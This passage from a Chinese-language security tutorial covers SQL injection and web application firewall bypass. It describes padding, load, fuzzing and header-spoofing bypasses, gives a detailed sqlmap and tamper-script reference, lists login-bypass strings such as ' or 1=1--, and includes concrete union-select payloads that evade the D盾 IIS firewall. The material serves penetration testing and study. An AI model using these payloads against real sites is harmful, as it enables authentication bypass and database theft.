<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">现在问题就是检测多长呢？例如我用HTTP POST上传一个2G的文件，明显不可能2G全做检测不但耗CPU，同时也会耗内存。因此在设计WAF的时候可能就会设计一个默认值，有可能是默认多少个字节的流大小，可能是多少个数据包。</span><br><span class="line"></span><br><span class="line">之前在zone发过个帖子，http://zone.wooyun.org/content/17331，是测试安全狗的，大致原理应该是一样的，设计了一个脚本，不断的向HTTP POST添加填充数据，当将填充数据添加到一定数目之后，发现POST中的sql注入恶意代码没有被检测了。最终达到了bypass的目的。</span><br><span class="line"></span><br><span class="line">在测试某家云WAF的时候使用此类方法也可以达到bypass的目的。</span><br></pre></td></tr></table></figure>

<h6 id="性能负载bypass"><a href="#性能负载bypass" class="headerlink" title="性能负载bypass"></a>性能负载bypass</h6><p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/per-bypass2.jpg" alt="per-bypass2"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">一些传统硬件防护设备为了避免在高负载的时候影响用户体验，如延时等等问题，会考虑在高负载的时候bypass掉自己的防护功能，等到设备的负载低于门限值的时候又恢复正常工作。</span><br><span class="line"></span><br><span class="line">一些高性能的WAF可能使用这种方法可能不能bypass，但是一些软WAF使用这种方式还是可以bypass的。</span><br><span class="line"></span><br><span class="line">http://wooyun.org/bugs/wooyun-2010-094367 一个bypass的例子，将请求并发同时发送多次，多次访问的时候就有几次漏掉了，没有触发waf的拦截。</span><br><span class="line"></span><br><span class="line">Ps.作者自己在测试的时候曾经做了如下测试制造了一个payload，同时添加了大量的无效数据，使用脚本兵法发送该请求，发现请求的时候有些通过了WAF，有些被WAF所拦截了。应该就是性能问题导致了bypass。</span><br></pre></td></tr></table></figure>

<h4 id="fuzz-bypass"><a href="#fuzz-bypass" class="headerlink" title="fuzz bypass"></a>fuzz bypass</h4><p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/fuzz-bypass1.jpg" alt="fuzz-bypass1"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">使用脚本去探测WAF设备对于字符处理是否有异常，上面已经说过WAF在接收到网络数据之后会做相应的数据包解析，一些WAF可能由于自身的解析问题，对于某些字符解析出错，造成全局的bypass。 我测试的时候常常测试的位置：</span><br><span class="line"></span><br><span class="line">1）：get请求处</span><br><span class="line">2）：header请求处</span><br><span class="line">3）：post urlencode内容处</span><br><span class="line">4）：post form-data内容处</span><br><span class="line">然后模糊测试的基础内容有：</span><br><span class="line"></span><br><span class="line">1）编码过的0-255字符</span><br><span class="line">2）进行编码的0-255字符</span><br><span class="line">3）utf gbk字符</span><br><span class="line">实例1：http://wooyun.org/bugs/wooyun-2010-087545</span><br><span class="line"></span><br><span class="line">在一次测试安全狗的过程中，使用post的方式提交数据，提交数据包括两个参数，一个是正常的fuzz点，另一个参数包含一个sql注入语句。当在测试前面的fuzz点的时候，处理到\x00的字符的时候，没有提示安全狗阻拦。应该是解析这个字符的时候不当，导致了bypass。</span><br><span class="line"></span><br><span class="line">实例2：http://wooyun.org/bugs/wooyun-2015-091516</span><br><span class="line"></span><br><span class="line">在一次测试云WAF中，使用get方式提交数据，提交内容包括一个参数，参数为字符+sql注入的语句。当在fuzz字符的时候，发现云waf在处理到&amp;字符的时候，没有提示云waf阻拦。由于&amp;字符的特殊性，猜测是由于和url请求中的&amp;没有处理好导致的。由于mysql中&amp;&amp;同样可以表示and，因此拼凑一下sql语句就达到了bypass的目的。</span><br><span class="line"></span><br><span class="line">Ps.上面做模糊测试的时候仅仅是测试了一些各个位置的单个字符，应该还会有更复杂的测试，WAF并没想象的那么完美，肯定还可以fuzz出其他地方的问题。</span><br></pre></td></tr></table></figure>

<h4 id="白名单bypass"><a href="#白名单bypass" class="headerlink" title="白名单bypass"></a>白名单bypass</h4><p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass1.jpg" alt="white-bypass1"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">WAF在设计之初一般都会考虑白名单功能。如来自管理IP的访问，来自cdn服务器的访问等等。这些请求是可信任的，不必走WAF检测流程。</span><br><span class="line"></span><br><span class="line">获取白名单的ip地址如果是从网络层获取的ip，这种一般bypass不了，如果采用应用层的数据作为白名单，这样就可能造成bypass。</span><br><span class="line"></span><br><span class="line">之前有一篇文章： http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366#.VGmhx9Yi5Mu</span><br><span class="line"></span><br><span class="line">文章内容是通过修改http的header来bypass waf，这里我们截取文章中部分内容：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass2.jpg" alt="white-bypass2"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">这些header常常用来获取IP，可能还有其他的，例如nginx-lua-waf:</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/white-bypass3.jpg" alt="white-bypass3"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">获取clientip使用了X-Real-ip的header。</span><br><span class="line"></span><br><span class="line">此种方法还可以用来绕过如登陆锁ip，登陆多次验证码，后台验证等等的场景。</span><br></pre></td></tr></table></figure>

<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">特性就像是一个个特定的场景一样，一些是已经被研究人员发现的，一些是还没被发现，等待被研究人员发现的。</span><br><span class="line">随着一个个特性的发现，WAF的防护能力在web对抗中逐渐增强，在我看来，当所有的特性场景均被WAF考虑到的时候，势必就会有的新的发现。（如我们现在了解的mysql的场景）</span><br><span class="line">因此我们不用担心当所有的特性被WAF考虑到的时候我们无计可施，未知的特性那么多，我们还有很多地方可以去挖掘。</span><br><span class="line">当你发现这些姿势都不好使的时候，你就该去发现一些新的特性了，毕竟设计WAF的选手都是基于目前的认知下去设计的，当新的特性出现的时候，势必又是一波bypass。</span><br></pre></td></tr></table></figure>

<h1 id="自动化注入技术"><a href="#自动化注入技术" class="headerlink" title="自动化注入技术"></a>自动化注入技术</h1><h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">sqlmap支持五种不同的注入模式：</span><br><span class="line">参数：--technique</span><br><span class="line">1、Boolean-based blind，基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</span><br><span class="line">2、Time-based blind，基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</span><br><span class="line">3、Error-based，基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</span><br><span class="line">4、UNION query，联合查询注入，可以使用union的情况下的注入。</span><br><span class="line">5、Stacked queries，堆查询注入，可以同时执行多条语句的执行时的注入。</span><br><span class="line"></span><br><span class="line">sqlmap支持的数据库有：</span><br><span class="line">MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</span><br><span class="line"></span><br><span class="line">常用参数：</span><br><span class="line">-u</span><br><span class="line">-r</span><br><span class="line">--random-agent</span><br><span class="line">--delay</span><br><span class="line">--no-cast或者--hex  跑columns需要字典，使用参数解决</span><br><span class="line"></span><br><span class="line">不常用参数:</span><br><span class="line">参数拆分字符</span><br><span class="line">参数：--param-del</span><br><span class="line">当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</span><br><span class="line">例子：</span><br><span class="line">python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users</span><br><span class="line"></span><br><span class="line">HTTP认证保护</span><br><span class="line">参数：--auth-type,--auth-cred</span><br><span class="line">这些参数可以用来登陆HTTP的认证保护支持三种方式：</span><br><span class="line">1、Basic</span><br><span class="line">2、Digest</span><br><span class="line">3、NTLM</span><br><span class="line">例子：</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;</span><br><span class="line"></span><br><span class="line">HTTP协议的证书认证</span><br><span class="line">参数：--auth-cert</span><br><span class="line">当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。</span><br><span class="line">key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</span><br><span class="line"></span><br><span class="line">HTTP(S)代理</span><br><span class="line">参数：--proxy,--proxy-cred和--ignore-proxy</span><br><span class="line">使用--proxy代理是格式为：http://url:port。</span><br><span class="line">当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。</span><br><span class="line">--ignore-proxy拒绝使用本地局域网的HTTP(S)代理。</span><br><span class="line"></span><br><span class="line">HTTP请求延迟</span><br><span class="line">参数：--delay</span><br><span class="line">可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</span><br><span class="line"></span><br><span class="line">设定超时时间</span><br><span class="line">参数：--timeout</span><br><span class="line">可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</span><br><span class="line"></span><br><span class="line">设定延迟注入的时间</span><br><span class="line">参数：--time-sec</span><br><span class="line">当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒。</span><br><span class="line"></span><br><span class="line">设定重试超时</span><br><span class="line">参数：--retries</span><br><span class="line">当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</span><br><span class="line"></span><br><span class="line">设定随机改变的参数值</span><br><span class="line">参数：--randomize</span><br><span class="line">可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</span><br><span class="line"></span><br><span class="line">利用正则过滤目标网址</span><br><span class="line">参数：--scope</span><br><span class="line">例如：</span><br><span class="line">python sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;</span><br><span class="line"></span><br><span class="line">避免过多的错误请求被屏蔽</span><br><span class="line">参数：--safe-url,--safe-freq</span><br><span class="line">有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</span><br><span class="line">绕过这个策略有两种方式：</span><br><span class="line">1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</span><br><span class="line">2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</span><br><span class="line"></span><br><span class="line">关掉URL参数值编码</span><br><span class="line">参数：--skip-urlencode</span><br><span class="line">根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用--skip-urlencode参数。</span><br><span class="line"></span><br><span class="line">每次请求时候执行自定义的python代码</span><br><span class="line">参数：--eval</span><br><span class="line">在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。</span><br><span class="line">例子：</span><br><span class="line">python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span><br><span class="line"></span><br><span class="line">参数：--prefix,--suffix</span><br><span class="line">在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</span><br><span class="line">例如，代码中是这样调用数据库的：</span><br><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;</span><br><span class="line">这时你就需要--prefix和--suffix参数了：</span><br><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</span><br><span class="line">这样执行的SQL语句变成：</span><br><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;;</span><br><span class="line"></span><br><span class="line">页面比较</span><br><span class="line">参数：--string,--not-string,--regexp,--code</span><br><span class="line">默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。</span><br><span class="line">参数：--text-only,--titles</span><br><span class="line">有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。</span><br><span class="line"></span><br><span class="line">设定UNION查询字段数</span><br><span class="line">参数：--union-cols</span><br><span class="line">默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</span><br><span class="line"></span><br><span class="line">二阶SQL注入</span><br><span class="line">参数：--second-order</span><br><span class="line">有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址。</span><br><span class="line"></span><br><span class="line">sqlmap risk level指数</span><br><span class="line">参数：–risk 1(1,2,3)</span><br><span class="line">共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</span><br><span class="line">在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</span><br><span class="line">参数：–level 1(2,3,4,5)</span><br><span class="line">共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。</span><br><span class="line">这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</span><br><span class="line">总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</span><br><span class="line"></span><br><span class="line">参数：-p,--skip</span><br><span class="line">sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p &quot;id,user-anget&quot;</span><br><span class="line">当你使用--level的值很大但是有个别参数不想测试的时候可以使用--skip参数。</span><br><span class="line">例如：--skip=&quot;user-angent.referer&quot;</span><br><span class="line">在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*</span><br><span class="line"></span><br><span class="line">直接利用谷歌寻找网站的注入点</span><br><span class="line">参数：-g</span><br><span class="line">sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</span><br><span class="line">例子：</span><br><span class="line">python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</span><br><span class="line"></span><br><span class="line">用于表单注入</span><br><span class="line">参数：–data</span><br><span class="line">此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</span><br><span class="line"></span><br><span class="line">自动选择选择</span><br><span class="line">--answers=ANSWERS   Set question answers (e.g. &quot;quit=N,follow=N&quot;)</span><br><span class="line"></span><br><span class="line">显示等级</span><br><span class="line">参数：-v</span><br><span class="line">显示sqlmap对一个点是进行了怎样的尝试判断以及读取数据的</span><br><span class="line">共有七个等级，默认为1：</span><br><span class="line">0、只显示python错误以及严重的信息。</span><br><span class="line">1、同时显示基本信息和警告信息。（默认）</span><br><span class="line">2、同时显示debug信息。</span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line">4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。</span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>

<h2 id="使用tamper绕过waf"><a href="#使用tamper绕过waf" class="headerlink" title="使用tamper绕过waf"></a>使用tamper绕过waf</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">tamper用法</span><br><span class="line">python sqlmap.py -u &quot;http:/www.xxx.com?id=1&quot; --tamper=apostrophemask</span><br><span class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py 分别用&quot;NOT BETWEEN 0 AND #&quot;替换大于号&quot;&gt;&quot;，&quot;BETWEEN # AND #&quot;替换等于号&quot;=&quot;</span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用&quot;LIKE&quot;替换等于号&quot;=&quot;</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用&quot;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&quot;替换像&quot;CONCAT(A, B)&quot;的实例</span><br><span class="line">equaltolike.py 用&quot;LIKE&quot;运算符替换全部等于号&quot;=&quot;</span><br><span class="line">greatest.py 用&quot;GREATEST&quot;函数替换大于号&quot;&gt;&quot;</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用&quot;IF(ISNULL(A), B, A)&quot;替换像&quot;IFNULL(A, B)&quot;的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加&quot;sp_password&quot; for automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用&quot;/**/&quot;替换空格符</span><br><span class="line">space2dash.py 用破折号注释符&quot;–&quot;其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符&quot;#&quot;其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2morehash.py 用磅注释符&quot;#&quot;其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符&quot;#&quot;其次是一个换行符替换空格符</span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符&quot;–&quot;其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号&quot;+&quot;替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用&quot;UNION SELECT&quot;替换&quot;UNION ALL SELECT&quot;</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头&quot;X-originating-IP&quot;来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头&quot;X-Forwarded-For&quot;来绕过WAF</span><br><span class="line"></span><br><span class="line">其他技巧：</span><br><span class="line">xff注入：</span><br><span class="line">伪造ip地址，当被记录到数据库中时，可能造成注入，在header中加入X-Forwarded-For然后将请求保存为xxx.txt，使用sqlmap -r &quot;xxx.txt&quot; --level 5</span><br><span class="line">从数据库服务器中读取文件 参数：--file-read</span><br><span class="line">把文件上传到数据库服务器中 参数：--file-write,--file-dest</span><br><span class="line">爬行网站URL 参数：--crawl</span><br><span class="line">非交互模式 参数：--batch</span><br><span class="line">测试WAF/IPS/IDS保护 参数：--identify-waf</span><br><span class="line">启发式判断注入 参数：--smart（有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。）</span><br></pre></td></tr></table></figure>

<h1 id="其他注入技术"><a href="#其他注入技术" class="headerlink" title="其他注入技术"></a>其他注入技术</h1><h2 id="基于约束的SQL攻击"><a href="#基于约束的SQL攻击" class="headerlink" title="基于约束的SQL攻击"></a>基于约束的SQL攻击</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">也就是二次注入的原理</span><br><span class="line">因为sql的select是不忽视最大长度的限制的</span><br><span class="line">而insert是有最大长度的限制的，超过长度限制就会发生截断。</span><br><span class="line">所以可以利用insert插入一个任意用户名加（N个空格，一般64个）然后用select选择出来</span><br><span class="line">select默认是选择第一条数据，所以存在一个任意用户登录的漏洞</span><br></pre></td></tr></table></figure>

<h2 id="万能密码（内联注入）"><a href="#万能密码（内联注入）" class="headerlink" title="万能密码（内联注入）"></a>万能密码（内联注入）</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">admin&#x27; --</span><br><span class="line">admin&#x27; #</span><br><span class="line">admin&#x27;/*</span><br><span class="line">or &#x27;=&#x27; or</span><br><span class="line">&#x27; or 1=1--</span><br><span class="line">&#x27; or 1=1#</span><br><span class="line">&#x27; or 1=1/*</span><br><span class="line">&#x27;) or &#x27;1&#x27;=&#x27;1--</span><br><span class="line">&#x27;) or (&#x27;1&#x27;=&#x27;1--</span><br><span class="line"></span><br><span class="line">实战例子：</span><br><span class="line">select * from users where name=&#x27;.username.&#x27; and pass=&#x27;.password.&#x27;;</span><br><span class="line">在mysql查询语句中转义字符不参与闭合，当username=&#x27;\&#x27;时，sql语句变成了：</span><br><span class="line">select * from users where name=&#x27;\&#x27; and pass=&#x27;&#x27;;</span><br><span class="line">完成了闭合</span><br><span class="line">再使pass=or 1=1#即可绕过</span><br></pre></td></tr></table></figure>

<h1 id="后续扩展"><a href="#后续扩展" class="headerlink" title="后续扩展"></a>后续扩展</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 需要：查询A union 查询B 后，返回查询B内容</span><br><span class="line"></span><br><span class="line">2. select * from tab_name where id=1 or(列名)</span><br><span class="line">其实是遍历字段名中的每个值然后选取那些不为false的内容</span><br><span class="line">因为在mysql中&#x27;ssdd&#x27;字符串默认等于0等于false所以不显示</span><br><span class="line">而&#x27;4ddf&#x27;这样的字符串默认等于4，也就是true也就会返回了</span><br><span class="line"></span><br><span class="line">3. 无回显位，select * from test1 where id=&#x27;$_GET[id]&#x27;;使用payload：if(substr(flag,1,1)in(0x41),1,0)</span><br><span class="line"></span><br><span class="line">4. Dnslog在SQL注入中的实战</span><br><span class="line">https://www.anquanke.com/post/id/98096</span><br><span class="line"></span><br><span class="line">5. 各种延时注入：</span><br><span class="line">https://www.cnblogs.com/cyjaysun/p/4463979.html</span><br></pre></td></tr></table></figure>

<h1 id="ctf注入相关wp"><a href="#ctf注入相关wp" class="headerlink" title="ctf注入相关wp"></a>ctf注入相关wp</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">http://www.th1s.cn/index.php/2017/11/05/147.html</span><br><span class="line"></span><br><span class="line">条件竞争注入：</span><br><span class="line">http://www.pang0lin.com/?p=822</span><br><span class="line"></span><br><span class="line">http://www.sdnisc.cn/detail_285_286_719.html</span><br><span class="line"></span><br><span class="line">lctf:</span><br><span class="line">https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/</span><br></pre></td></tr></table></figure>

<h1 id="新出现的waf绕过技术汇总"><a href="#新出现的waf绕过技术汇总" class="headerlink" title="新出现的waf绕过技术汇总"></a>新出现的waf绕过技术汇总</h1><h3 id="2017-10-19Bypass-D盾-IIS防火墙SQL注入防御"><a href="#2017-10-19Bypass-D盾-IIS防火墙SQL注入防御" class="headerlink" title="2017-10-19Bypass D盾_IIS防火墙SQL注入防御"></a>2017-10-19Bypass D盾_IIS防火墙SQL注入防御</h3><h4 id="IIS-PHP-MYSQL"><a href="#IIS-PHP-MYSQL" class="headerlink" title="IIS+PHP+MYSQL"></a>IIS+PHP+MYSQL</h4><h5 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h5><p>PHP中的PATH_INFO问题，以下两个url等价</p>
<p><a href="http://x.x.x.x/3.php?id=1">http:/x.x.x.x/3.php?id=1</a>    &lt;&#x3D;&gt;    <a href="http://x.x.x.x/3.php/xxxxxxxxxxxxx?id=1">http://x.x.x.x/3.php/xxxxxxxxxxxxx?id=1</a></p>
<p>从白名单中随便挑个地址加在后面，可成功bypass，<a href="">http://10.9.10.206/3.php/admin.php?id=1  union select 1,2,schema_name from information_schema.SCHEMATA</a></p>
<p>经测试，GET、POST、COOKIE均有效，完全bypass</p>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/php_path_info_exp.png" alt="php_path_info_exp"></p>
<h5 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h5><p>Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0；</p>
<p>测试了一下，基本上针对MSSQL的[0x01-0x20]都被处理了，唯独在Mysql中还有一个%a0可以利用，可以看到%a0与select合体，无法识别，从而绕过。</p>
<p>id&#x3D;1  union%a0select 1,2,3 from admin</p>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/null_char_exp.png" alt="null_char_exp"></p>
<h5 id="N形式"><a href="#N形式" class="headerlink" title="\N形式"></a>\N形式</h5><p>主要思考问题，如何绕过union select以及select from？</p>
<p>如果说上一个姿势是union和select之间的位置的探索，那么是否可以考虑在union前面进行检测呢？</p>
<p>为此在参数与union的位置，经测试，发现\N可以绕过union select检测，同样方式绕过select from的检测。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=\Nunion(select 1,schema_name,\Nfrom information_schema.schemata)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/N_exp.png" alt="N_exp"></p>
<h4 id="IIS-ASP-ASPX-MSSQL"><a href="#IIS-ASP-ASPX-MSSQL" class="headerlink" title="IIS+ASP&#x2F;ASPX+MSSQL"></a>IIS+ASP&#x2F;ASPX+MSSQL</h4><p>搭建IIS+ASP&#x2F;ASPX+MSSQL环境，思路一致，只是语言与数据库特性有些许差异，继续来张D盾拦截图：</p>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/iis_asp_mssql_d_safe.png" alt="iis_asp_mssql_d_safe"></p>
<h5 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h5><p>ASP： 不支持，找不到路径，而且D盾禁止执行带非法字符或特殊目录的脚本（&#x2F;1.asp&#x2F;x），撤底没戏了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin.php/../1.asp?id=1 and 1=1    拦截</span><br><span class="line">/1.asp?b=admin.php&amp;id=1 and 1=1 拦截，可见D盾会识别到文件的位置，并不是只检测URL存在白名单那么简单了</span><br></pre></td></tr></table></figure>

<p>ASPX：与PHP类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/1.aspx/admin.php?id=1   union select 1,&#x27;2&#x27;,TABLE_NAME from INFORMATION_SCHEMA.TABLES 可成功bypass</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aspx_path_exp.png" alt="aspx_path_exp"></p>
<h5 id="空白字符-1"><a href="#空白字符-1" class="headerlink" title="空白字符"></a>空白字符</h5><p>Mssql可以利用的空白字符有：01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</p>
<p>[0x01-0x20]全部都被处理了，想到mysql %a0的漏网之鱼是否可以利用一下?</p>
<p>ASP+MSSQL:  不支持%a0，已放弃</p>
<p>ASPX+MSSQL: %a0+%0a配合，可成功绕过union select的检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union%a0%0aselect 1,&#x27;2&#x27;,TABLE_NAME %a0from INFORMATION_SCHEMA.TABLES</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/aspx_0a_exp.png" alt="aspx_0a_exp"></p>
<h5 id="1E形式"><a href="#1E形式" class="headerlink" title="1E形式"></a>1E形式</h5><p>MSSQL属于强类型，这边的绕过是有限制，from前一位显示位为数字类型，这样才能用1efrom绕过select from。</p>
